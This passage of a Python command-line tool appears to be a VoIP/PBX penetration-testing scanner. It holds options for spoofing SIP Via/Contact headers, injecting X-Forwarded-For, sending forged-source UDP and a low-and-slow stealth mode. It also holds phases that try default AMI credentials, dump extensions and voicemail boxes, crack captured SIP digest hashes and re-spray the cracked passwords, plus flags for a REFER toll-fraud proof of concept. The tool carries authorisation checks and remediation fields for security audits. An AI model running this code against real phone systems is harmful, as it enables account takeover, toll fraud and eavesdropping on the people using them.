    c.add_argument("--remote-party-id",
                   help="Remote-Party-ID header (Cisco/legacy equivalent of PAI)")
    c.add_argument("--srtp", choices=["off", "offer", "require"], default="off",
                   help="Media-plane SRTP policy")
    c.add_argument("--call-duration", type=float, default=60.0, metavar="SECS",
                   help="Seconds to hold the call before sending BYE (default 60)")
    c.add_argument("--call-dtmf",
                   help='DTMF sequence after answer (e.g. "1p500#"; pN = N-ms pause)')
    c.add_argument("--discover-prefix", action="store_true",
                   help="Auto-discover dial-plan prefix (9, 0, +, etc.) before full call test. "
                        "Enabled automatically with --full when --call-to is set.")
    c.add_argument("--call-to-auto", action="store_true",
                   help="Use the AMI-discovered first extension as the from-number and try "
                        "a call to --call-to to show dialplan routing. "
                        "Requires --call-to for the actual destination number.")
    c.add_argument("--check-refer", action="store_true",
                   help="Run REFER blind-transfer toll-fraud PoC and SUBSCRIBE presence "
                        "eavesdrop probe. Auto-enabled when REFER or SUBSCRIBE appear in "
                        "the Allow header.")
    c.add_argument("--refer-to",
                   help="Destination number for REFER blind-transfer PoC "
                        "(defaults to --call-to when set)")

    sp = p.add_argument_group("IP spoofing / ACL bypass (authorised testing only)")
    sp.add_argument("--spoof-ip",
                    metavar="IP",
                    help="Override the IP shown in SIP Via/Contact headers. "
                         "The real socket still binds to --source-ip; this only "
                         "affects what the PBX reads. Bypasses PBX ACLs that trust "
                         "RFC1918 or specific internal IPs at the SIP header level.")
    sp.add_argument("--auto-spoof", action="store_true",
                    help="After receiving 403/blocked, automatically try all bypass "
                         "strategies: loopback/RFC1918 Via spoofing, X-Forwarded-For "
                         "injection, source-port 5060, UA impersonation. Stops at the "
                         "first technique that yields a non-403 response.")
    sp.add_argument("--xff-inject",
                    metavar="IP",
                    help="Inject X-Forwarded-For and X-Real-IP headers with this IP "
                         "value. Effective against SIP proxies / SBCs that forward "
                         "these headers inward and apply trust decisions from them.")
    sp.add_argument("--raw-spoof-src",
                    metavar="IP",
                    help="Send one-way raw UDP packets with this forged source IP "
                         "(tests whether the PBX has IP-layer ACLs). Requires "
                         "CAP_NET_RAW / root. No response is received — use alongside "
                         "--auto-spoof or --enum to see whether the PBX acts on it.")

    t = p.add_argument_group("Tuning")
    t.add_argument("--mode", choices=["fast", "standard", "stealth"],
                   default="standard",
                   help="Preset: fast (aggressive), standard (default), stealth (low-and-slow). "
                        "Overridden by explicit --rate/--timeout/--workers.")
    t.add_argument("--rate", type=float, default=None,
                   help="Max requests per second (default: from --mode)")
    t.add_argument("--timeout", type=float, default=None,
                   help="Socket timeout in seconds (default: from --mode)")
    t.add_argument("--workers", type=int, default=None,
                   help="Parallel workers for sweeps (default: from --mode)")
    t.add_argument("--jitter", type=float, default=None,
                   help="Random per-request sleep: 0 to JITTER seconds. "
                        "Default: 0.0 for fast/standard, 0.15 for stealth. "
                        "In stealth mode, a minimum of 0.05s jitter is always applied.")
    t.add_argument("--port", type=int, default=5060,
                   help="SIP port (default 5060)")
    t.add_argument("--ami-port", type=int, default=5038,
                   help="AMI port (default 5038)")
    t.add_argument("--http-attack-port", type=int, default=8088,
                   help="Asterisk HTTP API port (default 8088)")
    t.add_argument("--source-ip", default="",
                   help="Bind local sockets to this IP (for multi-NIC hosts)")
    t.add_argument("--network", default="",
                   help="Select outbound network interface by index (0, 1, …) or name "
                        "(e.g. en0, eth0). Run with --list-networks to see available "
                        "interfaces. Sets --source-ip automatically.")
    t.add_argument("--stun",
                   help="Resolve public IP via STUN before scan. "
                        "Use '--stun auto' to try well-known public STUN servers, "
                        "or '--stun host[:port]' for a specific server. "
                        "Enabled automatically with --full.")
    t.add_argument("--no-upnp", action="store_true",
                   help="Disable UPnP/IGD port mapping (NAT traversal). "
                        "By default the scanner attempts UPnP to punch a pinhole "
                        "on the local router so the PBX can route BYE responses back.")
    t.add_argument("--source-port-range",
                   help="Bind within port range, inclusive (e.g. '5060-5099')")
    t.add_argument("--max-failures-per-ext", type=int, default=5,
                   help="Stop spraying an extension after N failed attempts (default 5)")

    o = p.add_argument_group("Output")
    o.add_argument("--report-dir",
                   help="Directory for report.html and report.json (default reports/<timestamp>)")
    o.add_argument("--json-output",
                   metavar="FILE",
                   help="Write machine-readable JSON findings to FILE (e.g. findings.json)")
    o.add_argument("--no-color", action="store_true",
                   help="Disable ANSI colour output")
    o.add_argument("--list-networks", action="store_true",
                   help="Print available network interfaces and exit (use with --network)")

    return p.parse_args()


def _parse_port_range(spec: str | None) -> tuple[int, int] | None:
    if not spec:
        return None
    try:
        lo_s, hi_s = spec.split("-", 1)
        lo, hi = int(lo_s), int(hi_s)
    except ValueError:
        raise SystemExit(f"ERROR: --source-port-range must be 'low-high', got {spec!r}")
    if not (1 <= lo <= hi <= 65535):
        raise SystemExit(f"ERROR: --source-port-range out of bounds: {spec}")
    return (lo, hi)


def _list_interfaces() -> list[tuple[str, str]]:
    """Return [(name, ipv4), ...] for non-loopback IPv4 interfaces."""
    try:
        import netifaces  # type: ignore[import]
        result = []
        for name in netifaces.interfaces():
            for addr in netifaces.ifaddresses(name).get(netifaces.AF_INET, []):
                ip = addr.get("addr", "")
                if ip and not ip.startswith("127."):
                    result.append((name, ip))
        return result
    except ImportError:
        pass

    # stdlib fallback: ifconfig (macOS/BSD) or ip addr (Linux)
    try:
        if sys.platform == "darwin":
            raw = subprocess.check_output(["ifconfig"], text=True, stderr=subprocess.DEVNULL)
            ifaces, current = [], None
            for line in raw.splitlines():
                m = re.match(r'^(\S+):', line)
                if m:
                    current = m.group(1)
                elif current:
                    m = re.match(r'\s+inet (\d+\.\d+\.\d+\.\d+)', line)
                    if m and not m.group(1).startswith("127."):
                        ifaces.append((current, m.group(1)))
            return ifaces
        else:
            raw = subprocess.check_output(["ip", "-4", "addr"], text=True, stderr=subprocess.DEVNULL)
            ifaces, current = [], None
            for line in raw.splitlines():
                m = re.match(r'^\d+: (\S+?)[@:]', line)
                if m:
                    current = m.group(1)
                elif current:
                    m = re.match(r'\s+inet (\d+\.\d+\.\d+\.\d+)', line)
                    if m and not m.group(1).startswith("127."):
                        ifaces.append((current, m.group(1)))
            return ifaces
    except Exception:
        return []


def _resolve_network_arg(value: str) -> str:
    """Resolve --network INDEX-or-NAME to an IPv4 address string."""
    ifaces = _list_interfaces()
    if not ifaces:
        raise SystemExit("ERROR: --network: could not enumerate network interfaces. "
                         "Use --source-ip directly.")
    # Try numeric index
    if re.fullmatch(r'\d+', value):
        idx = int(value)
        if idx >= len(ifaces):
            lines = "\n".join(f"  {i}: {n}  {ip}" for i, (n, ip) in enumerate(ifaces))
            raise SystemExit(f"ERROR: --network {idx} out of range. Available:\n{lines}")
        return ifaces[idx][1]
    # Try interface name
    for name, ip in ifaces:
        if name == value:
            return ip
    lines = "\n".join(f"  {i}: {n}  {ip}" for i, (n, ip) in enumerate(ifaces))
    raise SystemExit(f"ERROR: --network {value!r} not found. Available:\n{lines}")


# ---------------------------------------------------------------------------
# Phase helpers — each takes a ScanState and mutates it in place.
# All inter-phase data flows through the ScanState pools.
# ---------------------------------------------------------------------------


def _phase_ami_attack(
    state: "ScanState",
    args,
    col: "Colours",
    traffic_log,
    source_port_range,
) -> None:
    """Phase: AMI / management attack.  On success, immediately feeds
    loot into state.extension_list and state.crack_pool so that
    subsequent enum and spray phases start with ground-truth data.
    """
    ami_open = any(p["service"] == "Asterisk-AMI" for p in state.open_ports)
    if ami_open:
        _info(f"Trying AMI default credentials on TCP/{args.ami_port}...", col)
        _jitter_sleep(args.jitter)
        ami_res = ami.attack(
            state.ip, port=args.ami_port,
            timeout=args.timeout, traffic_log=traffic_log,
        )
        state.ami = asdict(ami_res)
        if ami_res.success:
            _finding(
                "critical",
                f"AMI pwned: {col.BOLD}{ami_res.username}/{ami_res.password}{col.RESET}  "
                f"({len(ami_res.extensions)} extensions, "
                f"{len(ami_res.voicemail_boxes)} voicemail boxes dumped)",
                col,
            )
            # ── Feed loot into adaptive pools IMMEDIATELY ─────────────────
            if ami_res.extensions:
                n_new = state.add_extensions(ami_res.extensions, source="ami_dump")
                if n_new:
                    _ok(
                        f"[ADAPTIVE] AMI loot: {n_new} new extension(s) injected "
                        f"into EXTENSION_LIST → available to enum + spray now",
                        col,
                    )
            if ami_res.password:
                n_new = state.add_to_crack_pool([ami_res.password])
                if n_new:
                    _ok(
                        f"[ADAPTIVE] AMI password promoted to front of CRACK_POOL "
                        f"→ will be tried first in every spray pass",
                        col,
                    )
        elif ami_res.reachable:
            _warn("AMI reachable but no default creds matched.", col)
        else:
            _info("AMI port not reachable.", col)

    # Asterisk HTTP rawman API
    http_attack_port = args.http_attack_port
    _info(f"Trying Asterisk HTTP /rawman on port {http_attack_port}...", col)
    _jitter_sleep(args.jitter)
    ami_http_res = ami.attack_asterisk_http(
        state.ip, port=http_attack_port, timeout=args.timeout,
    )
    state.ami_http = asdict(ami_http_res)
    if ami_http_res.success:
        _finding(
            "critical",
            f"Asterisk HTTP /rawman authenticated: "
            f"{col.BOLD}{ami_http_res.username}/{ami_http_res.password}{col.RESET}",
            col,
        )


def _phase_cve_check(
    state: "ScanState",
    args,
    col: "Colours",
    sip_port: int,
    report_dir: str,
    traffic_log,
) -> None:
    """Phase: CVE / vulnerability scan.  Platform fingerprint gates which
    checks run.  Auth-bypass CVE confirmations set
    state.cve_auth_bypass_triggered so the spray phase runs harder.
    Cracked passwords from cleartext capture go into state.crack_pool.
    """
    if not _CVE_AVAILABLE:
        _warn("CVE module not available — skipping CVE scan.", col)
        return

    tcp_ports = sorted({p["port"] for p in state.open_ports if p["proto"] == "tcp"})
    sip_info = state.sip or {}
    sip_transport = sip_info.get("transport", "udp")
    sip_tcp = sip_transport in ("tcp", "tls")
    sip_tls = sip_transport == "tls"
    sip_server_banner = sip_info.get("server", "")

    _jitter_sleep(args.jitter)
    cve_results = cve_module.check_all(
        state.ip,
        tcp_ports=tcp_ports,
        fingerprint=state.fingerprint,
        sip_server=sip_server_banner,
        sip_port=sip_port,
        timeout=args.timeout,
    )
    state.cve_findings = [
        {
            "cve_id": r.cve_id, "platform": r.platform,
            "severity": r.severity, "host": r.host, "port": r.port,
            "title": r.title, "evidence": r.evidence,
            "remediation": r.remediation,
            "affected_version": r.affected_version,
        }
        for r in cve_results
    ]

    for r in cve_results:
        _verify_badge = (
            f" {col.GREEN}[CONFIRMED]{col.RESET}" if getattr(r, "confirmed", True)
            else f" {col.YELLOW}[CONFIG/VERSION]{col.RESET}"
        )
        _finding(r.severity, f"{r.cve_id} — {r.title}{_verify_badge}", col)

        # ── Auth-bypass CVE → arm deeper spray ───────────────────────────
        if r.cve_id in _AUTH_BYPASS_CVES and getattr(r, "confirmed", True):
            state.cve_auth_bypass_triggered = True
            _warn(
                f"[ADAPTIVE] {r.cve_id} is an auth-bypass — "
                "credential spray will run at maximum depth even with no enumerated extensions",
                col,
            )

        # ── Cleartext SIP capture + auto-crack ───────────────────────────
        if r.cve_id in ("CONFIG-SIP-TLS", "CONFIG-SIP-WS-PLAIN"):
            _cap_port = 8088 if r.cve_id == "CONFIG-SIP-WS-PLAIN" else sip_port
            _cleartext_ev = cve_module.capture_cleartext_sip_evidence(
                state.ip, sip_port=_cap_port,
                source_ip=args.source_ip, timeout=args.timeout,
            )
            _agg = _cleartext_ev.get("aggregated", {})
            _has_creds = bool(_cleartext_ev.get("challenge"))
            _has_keys = bool(
                _cleartext_ev.get("sdp_crypto_echoed") or _agg.get("all_srtp_keys")
            )
            _has_intel = bool(
                _agg.get("all_internal_ips") or _agg.get("all_extensions")
            )
            if _has_creds or _has_keys or _has_intel:
                _show_cleartext_capture(_cleartext_ev, col)
                if _has_creds and _CRACK_AVAILABLE:
                    _challenge = _cleartext_ev.get("challenge", {})
                    _crack_ext = _cleartext_ev.get(
                        "extension",
                        _agg.get("all_extensions", ["1000"])[0]
                        if _agg.get("all_extensions") else "1000",
                    )
                    import threading as _th
                    _crack_result: list = [None]

                    def _do_crack(
                        ch=_challenge, ext=_crack_ext, hst=state.ip,
                        port=_cap_port, src=args.source_ip,
                        to=args.timeout, tcp=sip_tcp, tls=sip_tls,
                    ) -> None:
                        _crack_result[0] = crack_module.crack_sip_digest_challenge(
                            challenge=ch, extension=ext,
                            host=hst, sip_port=port,
                            source_ip=src, timeout=to,
                            tcp=tcp, use_tls=tls,
                            time_limit=50.0,
                        )

                    _ct = _th.Thread(target=_do_crack, daemon=True)
                    _ct.start()
                    _ct.join(timeout=55.0)
                    if _crack_result[0]:
                        _cracked_pw, _crack_src = _crack_result[0]
                        _finding(
                            "critical",
                            f"SIP-CREDENTIAL-CRACKED — ext {col.BOLD}{_crack_ext}{col.RESET} "
                            f"password: {col.RED}{col.BOLD}{_cracked_pw}{col.RESET}  "
                            f"realm={_challenge.get('realm','?')}  source={_crack_src}",
                            col,
                        )
                        cc_entry = {
                            "extension": _crack_ext,
                            "password": _cracked_pw,
                            "realm": _challenge.get("realm", ""),
                            "source": _crack_src,
                        }
                        state.cracked_credentials.append(cc_entry)
                        # ── Feed into crack_pool IMMEDIATELY ──────────────
                        n_new = state.add_to_crack_pool([_cracked_pw])
                        if n_new:
                            _ok(
                                f"[ADAPTIVE] Cleartext-cracked password promoted to "
                                f"CRACK_POOL → available to all subsequent spray passes",
                                col,
                            )


def _phase_crack_hashes_and_respray(
    state: "ScanState",
    args,
    col: "Colours",
    sip_port: int,
    report_dir: str,
    traffic_log,
    source_port_range,
) -> None:
    """Phase: offline hash cracking from sip_hashes.txt → extend CRACK_POOL
    → targeted re-spray of only the new passwords against uncracked extensions.

    This phase is a no-op when:
    - crack module is unavailable
    - sip_hashes.txt is empty or absent
    - no new passwords are discovered by cracking
    """
    if not _CRACK_AVAILABLE:
        return

    hash_file = os.path.join(report_dir, "sip_hashes.txt")
    if not os.path.exists(hash_file):
        return

    # Parse hash lines written by auth.spray() — format:
    #   username*realm*nonce*uri*response
    challenges: list[dict] = []
    seen_nonces: set[str] = set()
    try:
        with open(hash_file) as _hf:
            for line in _hf:
                line = line.strip()
                if not line:
                    continue
                parts = line.split("*")
                if len(parts) == 5:
                    username, realm, nonce, uri, response = parts
                    if nonce not in seen_nonces:
                        seen_nonces.add(nonce)
                        challenges.append({
                            "username": username,
                            "realm": realm,
                            "nonce": nonce,
                            "uri": uri,
                            "response": response,
                        })
    except OSError:
        return

    if not challenges:
        return

    sip_info = state.sip or {}
    sip_transport = sip_info.get("transport", "udp")
    sip_tcp = sip_transport in ("tcp", "tls")
    sip_tls = sip_transport == "tls"

    _info(
        f"[CRACK_HASHES] {len(challenges)} unique challenge(s) in sip_hashes.txt — "
        f"attempting offline crack...",
        col,
    )

    newly_cracked_passwords: list[str] = []
    for ch in challenges[:20]:  # cap at 20 unique challenges per host
        ext = ch.get("username", "1000")
        if ext in state.confirmed_exts:
            continue  # already cracked via spray — skip
        result = crack_module.crack_sip_digest_challenge(
            challenge=ch,
            extension=ext,
            host=state.ip,
            sip_port=sip_port,
            source_ip=args.source_ip,
            timeout=args.timeout,
            tcp=sip_tcp,
            use_tls=sip_tls,
            time_limit=30.0,
        )
        if result:
            cracked_pw, crack_src = result
            _finding(
                "critical",
                f"[HASH-CRACK] ext {col.BOLD}{ext}{col.RESET} password: "
                f"{col.RED}{col.BOLD}{cracked_pw}{col.RESET}  "
                f"realm={ch.get('realm', '?')}  source={crack_src}",
                col,
            )
            state.cracked_credentials.append({
                "extension": ext,
                "password": cracked_pw,
                "realm": ch.get("realm", ""),
                "source": crack_src,
            })
            newly_cracked_passwords.append(cracked_pw)

    n_new = state.add_to_crack_pool(newly_cracked_passwords)
    if n_new == 0:
        _info("[CRACK_HASHES] No new passwords cracked from captured hashes.", col)
        return

    _ok(
        f"[ADAPTIVE] {n_new} new password(s) cracked from SIP hashes → "
        f"added to CRACK_POOL — running targeted re-spray now...",
        col,
    )

    # Targeted re-spray: only the new passwords × all uncracked extensions
    respray_targets = state.spray_targets()
    if not respray_targets:
        _info("[CRACK_HASHES] Re-spray skipped — no uncracked extensions remain.", col)
        return

    # Build a minimal cred list from the newly cracked passwords only
    respray_creds: list[tuple[str, str]] = [
        (ext, pw)
        for pw in newly_cracked_passwords
        for ext in respray_targets
    ]
    # auth.spray() takes (username, password) pairs; pass as self-password
    _info(
        f"[CRACK_HASHES] Re-spraying {len(newly_cracked_passwords)} new password(s) "
        f"× {len(respray_targets)} extension(s)...",
        col,
    )
    _jitter_sleep(args.jitter)
    respray_hits = auth.spray(
        state.ip,
        respray_targets,
        [],                          # empty wordlist — only ami_cracked_passwords used
        port=sip_port,
        timeout=args.timeout,
        max_workers=args.workers,
        max_failures_per_ext=args.max_failures_per_ext,
        traffic_log=traffic_log,
        source_ip=args.source_ip,
        tcp=sip_tcp,
        use_tls=sip_tls,
        ami_cracked_passwords=newly_cracked_passwords,  # promoted to front
        hash_log_path=None,  # no need to re-log hashes we already cracked
    )
    for hit in respray_hits:
        if hit.success:
            hit_dict = asdict(hit)
            state.credentials_found.append(hit_dict)
            state.confirmed_exts.add(hit.extension)
            _finding(
                "critical",
                f"[RE-SPRAY] Cracked: ext {col.BOLD}{hit.extension}{col.RESET}  "
                f"{hit.username} / {col.BOLD}{hit.password}{col.RESET}",
                col,
            )


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> int:
    print(BANNER)
    args = parse_args()

    col = Colours(force=False if args.no_color else None)

    # --list-networks: print interfaces and exit (no --target needed)
    if args.list_networks:
        ifaces = _list_interfaces()
        if not ifaces:
            print("No non-loopback IPv4 interfaces found.")
        else:
            print("Available network interfaces:")
            for i, (name, ip) in enumerate(ifaces):
                print(f"  {i}: {name:<12}  {ip}")
            print("\nUse:  --network 0   or   --network en0")
        return 0

    if not args.target:
        print("ERROR: --target is required", file=sys.stderr)
        return 2

    # Track whether the caller supplied an explicit --source-ip so STUN knows not to
    # override it.  --network-derived IPs are considered auto-detected (upgradeable).
    _source_ip_user_explicit: bool = bool(args.source_ip)

    # --network resolves to --source-ip; explicit --source-ip takes precedence
    if args.network and not args.source_ip:
        args.source_ip = _resolve_network_arg(args.network)
        _info(f"Network {args.network!r} → SIP header IP {args.source_ip} "
              f"(traffic routing follows OS table; STUN will upgrade if public IP differs)", col)
    elif args.network and args.source_ip:
        _warn("Both --network and --source-ip given; --source-ip takes precedence", col)

    # --full is an alias for --auto (backwards compat)
    if args.full and not args.auto:
        args.auto = True

    # --auto: one-command maximum-depth audit
    if args.auto:
        args.full = True
        args.ami_attack = True
        if args.mode == "standard":
            args.mode = "stealth"
        if not args.stun:
            args.stun = "auto"
        if not args.discover_prefix:
            args.discover_prefix = True
        # Auto-enable call test when --call-to is provided
        if args.call_to and not args.call_test:
            args.call_test = True
        if not args.i_have_authorization:
            _err("--auto requires --i-have-authorization", col)
            return 2
        _info("AUTO mode — hyper-intelligent scan, all checks enabled", col)

    # --full expands into constituent checks (spray is opt-in: too slow for default recon)
    if args.full:
        args.enum = True
        args.ami_attack = True
        # Auto-enable STUN and prefix discovery in full mode
        if not args.stun:
            args.stun = "auto"
        if args.call_to and not args.discover_prefix:
            args.discover_prefix = True

    # Apply mode preset; explicit flags win
    preset = _MODE_PRESETS[args.mode]
    if args.rate is None:
        args.rate = preset["rate"]
    if args.timeout is None:
        args.timeout = preset["timeout"]
    if args.workers is None:
        args.workers = preset["workers"]

    # Jitter: apply defaults based on mode, then enforce stealth minimum
    if args.jitter is None:
        if args.mode == "stealth":
            args.jitter = 0.15
        else:
            args.jitter = 0.0
    elif args.mode == "stealth":
        # Stealth mode enforces a minimum of 0.05s jitter
        args.jitter = max(args.jitter, 0.05)

    _info(f"Mode: {col.BOLD}{args.mode}{col.RESET} — {preset['desc']}", col)
    if args.jitter > 0.0:
        _info(f"Jitter: {args.jitter:.2f}s per-request random sleep enabled", col)

    if args.call_test and not args.call_to:
        _err("--call-test requires --call-to (a number YOU control)", col)
        return 2

    if args.call_to_auto and not args.call_to:
        _err("--call-to-auto requires --call-to (destination number)", col)
        return 2

    # CRLF injection guard: reject usernames/passwords containing CR or LF
    for _crlf_attr in ("username", "password"):
        _crlf_val = getattr(args, _crlf_attr, None)
        if _crlf_val and ("\r" in _crlf_val or "\n" in _crlf_val):
            _err(f"--{_crlf_attr} contains CR/LF characters", col)
            return 2

    source_port_range = _parse_port_range(args.source_port_range)

    # ---- STUN: resolve public/reflexive IP to fix Via/Contact headers behind NAT ----
    import ipaddress as _ipaddress

    def _is_globally_routable(ip: str) -> bool:
        """True only for addresses the PBX can actually route back to us."""
        try:
            a = _ipaddress.ip_address(ip)
            return not (a.is_private or a.is_loopback or a.is_link_local
                        or a.is_reserved or a.is_multicast
                        or _ipaddress.ip_network(ip).overlaps(
                            _ipaddress.ip_network("100.64.0.0/10")))  # CGNAT RFC 6598
        except ValueError:
            return False

    # ---- STUN + NAT: run concurrently to save 2-4 s startup time ----
    # STUN (public IP resolution) and NAT type detection both make outbound UDP
    # queries and are independent — parallelise with two threads.
    import concurrent.futures as _cf_net
    import threading as _thr_net

    _stun_public_ip: str | None = None
    _nat_ctx = None

    _stun_arg = (None if not args.stun or args.stun.lower() == "auto" else args.stun)
    _nat_ports: list[int] = [5062, 5063]
    if source_port_range:
        lo, hi = source_port_range
        _nat_ports = list(range(lo, min(lo + 4, hi + 1)))

    def _run_stun_task() -> str | None:
        if not args.stun:
            return None
        from scanner.stun import resolve_public_ip
        return resolve_public_ip(stun_server=_stun_arg, timeout=max(args.timeout, 2.0))

    def _run_nat_task():
        if getattr(args, "no_upnp", False):
            return None
        from scanner import nat as _nat_mod
        return _nat_mod.setup(
            ports_to_map=_nat_ports,
            local_ip=args.source_ip or "",
            public_ip="",  # merged below after both tasks complete
            stun_server=_stun_arg,
            enable_upnp=True,
            timeout=min(args.timeout, 3.0),
        )

    _info("NAT: resolving public IP + detecting topology in parallel...", col)
    with _cf_net.ThreadPoolExecutor(max_workers=2) as _pool:
        _stun_fut = _pool.submit(_run_stun_task)
        _nat_fut = _pool.submit(_run_nat_task)
        _stun_raw = _stun_fut.result()
        _nat_raw = _nat_fut.result()

    # ── Process STUN result ────────────────────────────────────────────────
    if _stun_raw and _is_globally_routable(_stun_raw):
        _stun_public_ip = _stun_raw
        _ok(f"Public IP (reflexive): {col.BOLD}{_stun_public_ip}{col.RESET} — patched into SIP Via/Contact", col)
        if not _source_ip_user_explicit or not _is_globally_routable(args.source_ip or ""):
            args.source_ip = _stun_public_ip
        else:
            _info(f"STUN resolved {_stun_public_ip} but --source-ip {args.source_ip} "
                  f"is already a public IP — keeping user value", col)
    elif _stun_raw:
        _warn(f"STUN returned {_stun_raw} (non-public / CGNAT address) — "
              f"SIP headers will use local IP; responses may not reach us behind this NAT", col)
    elif args.stun:
        _warn("STUN lookup failed — continuing with local IP (may fail behind NAT)", col)

    # ── Process NAT result ────────────────────────────────────────────────
    _nat_ctx = _nat_raw
    if _nat_ctx is not None:
        # Merge: STUN-discovered public IP is more authoritative than NAT's reflexive guess
        if _stun_public_ip:
            _nat_ctx.public_ip = _stun_public_ip
        elif _nat_ctx.public_ip and _is_globally_routable(_nat_ctx.public_ip):
            # NAT discovered its own public IP — adopt it if STUN didn't give us one
            if not _source_ip_user_explicit or not _is_globally_routable(args.source_ip or ""):
                args.source_ip = _nat_ctx.public_ip
                _stun_public_ip = _nat_ctx.public_ip

        _nat_type_str = _nat_ctx.nat_type
        _nat_colour = col.GREEN if _nat_type_str in ("direct", "full_cone") else col.YELLOW
        _ok(f"NAT: {_nat_colour}{_nat_ctx.summary()}{col.RESET}", col)

        if _nat_ctx.upnp_available:
            _ok(f"  UPnP gateway found — {len(_nat_ctx.mapped_ports)} port(s) mapped through router", col)
            if (_nat_ctx.public_ip and not _stun_public_ip
                    and _is_globally_routable(_nat_ctx.public_ip)):
                args.source_ip = _nat_ctx.public_ip
                _stun_public_ip = _nat_ctx.public_ip
                _ok(f"  Public IP from UPnP: {col.BOLD}{_nat_ctx.public_ip}{col.RESET}", col)

        # ── Symmetric NAT auto-remedy ─────────────────────────────────────
        # Symmetric NAT remaps port per destination: STUN reports port X but
        # PBX sees port Y.  TCP is connection-oriented so replies always route
        # on the established connection — no port remapping occurs.
        if _nat_ctx.prefers_tcp and not getattr(args, "tcp", False) \
                and not getattr(args, "tls", False):
            args.tcp = True
            _warn(
                f"{col.RED}[SYMMETRIC-NAT]{col.RESET} NAT remaps port per destination — "
                f"auto-enabling TCP so replies route on the established connection.",
                col,
            )
        elif _nat_ctx.prefers_tcp:
            _info("Symmetric/port-restricted NAT — TCP already active, BYE routing OK.", col)

        # ── NAT keepalive thread ──────────────────────────────────────────
        # Home routers expire UDP NAT bindings in 30-120 s.  Long scans
        # (2000-ext enum + spray) can take 5-15 min.  A 25 s keepalive from
        # the fixed source ports prevents the PBX's replies from being dropped
        # mid-session.  Only useful when UPnP is absent (UPnP pinhole = 2 h).
        _nat_keepalive_thread: _thr_net.Thread | None = None
        if (_nat_ctx.nat_type not in ("direct", "unknown")
                and not _nat_ctx.upnp_available
                and not getattr(args, "tcp", False)
                and _nat_ports):

            def _nat_keepalive_loop(ports: list[int], stop_ev: _thr_net.Event) -> None:
                from scanner.nat import _stun_binding, _PUBLIC_STUN_PAIRS
                idx = 0
                while not stop_ev.wait(25):  # 25 s < home-router 30 s minimum
                    host, port = _PUBLIC_STUN_PAIRS[idx % len(_PUBLIC_STUN_PAIRS)]
                    for lp in ports:
                        try:
                            _stun_binding(host, port, local_port=lp, timeout=1.5)
                        except Exception:
                            pass
                    idx += 1

            _keepalive_stop = _thr_net.Event()
            _nat_keepalive_thread = _thr_net.Thread(
                target=_nat_keepalive_loop,
                args=(_nat_ports, _keepalive_stop),
                daemon=True,
                name="nat-keepalive",
            )
            _nat_keepalive_thread.start()
            _info(
                f"NAT keepalive active — refreshing bindings on ports "
                f"{_nat_ports} every 25 s (NAT={_nat_ctx.nat_type})",
                col,
            )

    # ── IP spoofing / header-bypass setup ────────────────────────────────────
    # Resolve the effective header IP: what appears in Via/Contact headers.
    # Decoupled from the socket bind IP so the PBX can be fed any IP while
    # our socket still receives responses on the real interface.
    _spoof_header_ip: str | None = getattr(args, "spoof_ip", None) or None
    _auto_spoof: bool = bool(getattr(args, "auto_spoof", False))
    _xff_inject: str | None = getattr(args, "xff_inject", None) or None
    _raw_spoof_src: str | None = getattr(args, "raw_spoof_src", None) or None

    # Build base extra headers that go on every SIP message when XFF is set
    _base_extra_headers: list[str] = []
    if _xff_inject:
        _no_crlf = lambda v: v  # local lint-suppressor; real guard in sip.build_message
        _base_extra_headers = [
            f"X-Forwarded-For: {_xff_inject}",
            f"X-Real-IP: {_xff_inject}",
        ]
        _info(f"XFF injection active: X-Forwarded-For: {_xff_inject}", col)

    if _spoof_header_ip:
        _info(
            f"Header IP spoof active: Via/Contact will show "
            f"{col.YELLOW}{_spoof_header_ip}{col.RESET} (socket binds to real IP)",
            col,
        )
    if _auto_spoof:
        from scanner.spoof import build_bypass_attempts  # noqa: F401
        _info(
            f"Auto-spoof enabled — will try bypass strategies automatically on 403/blocked",
            col,
        )
    if _raw_spoof_src:
        _info(
            f"Raw UDP spoof src: {_raw_spoof_src} — "
            f"requires CAP_NET_RAW/root; one-way probes only",
            col,
        )

    # ---- External tool detection ----
    global _EXT_TOOLS
    _EXT_TOOLS = _detect_external_tools()
    _avail = [t for t, p in _EXT_TOOLS.items() if p]
    if _avail:
        _info(f"External tools detected: {col.CYAN}{' · '.join(_avail)}{col.RESET}", col)
    else:
        _info("No external tools found (socat/nmap/sngrep not installed — continuing with built-ins)", col)

    operator, scope_sha = authorize(args, col)

    stamp = time.strftime("%Y%m%d-%H%M%S")
    report_dir = args.report_dir or os.path.join("reports", stamp)
    if chr(0) in report_dir:
        _err("--report-dir contains null bytes", col)
        return 2
    os.makedirs(report_dir, exist_ok=True)
    traffic_log = TrafficLog(os.path.join(report_dir, "traffic.log"))

    # ══════════════════════════════════════════════════════════════════════
    _phase("PHASE 1 · DISCOVERY", col)

    targets = discovery.expand_target(args.target)
    if not targets:
        _err(f"Could not resolve target: {args.target}", col)
        return 2

    _info(f"Scanning {len(targets)} host(s) for VoIP services...", col)
    extra_udp = [args.port] if args.port != 5060 else None
    hosts = discovery.sweep(
        targets, timeout=args.timeout, rate_per_second=args.rate,
        workers=args.workers, traffic_log=traffic_log,
        extra_udp_ports=extra_udp,
        source_ip=args.source_ip,
    )

    if not hosts:
        _warn("No VoIP services discovered.", col)
    else:
        _ok(f"{len(hosts)} host(s) responded:", col)
        for h in hosts:
            ports_str = " ".join(f"{p['port']}/{p['proto']}" for p in h.open_ports)
            ver_str = ("  v:" + (getattr(h, "version", "") or "?")) if getattr(h, "version", "") else ""
            _ok(f"  {col.BOLD}{h.ip}{col.RESET}  [{h.fingerprint}]{ver_str}  {ports_str}", col)

    host_reports: list[dict] = []

    for h in hosts:
        # Initialise the shared mutable scan state for this host.
        # All phases read from and write to this object; the two pools
        # (extension_list, crack_pool) carry live data between phases.
        state = ScanState(
            ip=h.ip,
            fingerprint=h.fingerprint,
            open_ports=h.open_ports,
            sip=h.sip,
            sip_port=args.port,
            sip_tcp=(h.sip or {}).get("transport", "udp") in ("tcp", "tls"),
            sip_tls=(h.sip or {}).get("transport", "udp") == "tls",
        )
        # Convenience aliases updated in place when SIP auto-recovery fires
        sip_info   = state.sip or {}
        sip_transport = sip_info.get("transport", "udp")
        sip_tcp    = state.sip_tcp
        sip_tls    = state.sip_tls
        sip_port   = state.sip_port

        # ══════════════════════════════════════════════════════════════════
        _phase(f"PHASE 2 · HTTP PROBES  [{h.ip}]", col)

        tcp_ports = sorted({p["port"] for p in h.open_ports if p["proto"] == "tcp"})
        if tcp_ports:
            _jitter_sleep(args.jitter)
            findings = http_probes.run_all(h.ip, tcp_ports, timeout=args.timeout)
            state.http_findings = [
